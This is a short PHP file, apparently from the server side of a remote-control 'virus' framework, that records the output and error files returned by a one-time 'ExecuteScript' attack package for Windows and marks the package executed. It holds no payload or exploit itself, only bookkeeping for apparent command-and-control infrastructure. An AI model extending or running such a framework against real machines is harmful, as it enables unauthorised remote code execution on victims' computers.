<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\ExecuteScript\ExecuteScript $this */

$this->setData($this->requestData->fileCheck("dataFile"));
$this->setError($this->requestData->fileCheck("errFile"));
$this->saveState();
$this->usage()->setDisk(filesize($this->getStatePath()))->saveState();
$this->setExecuted();
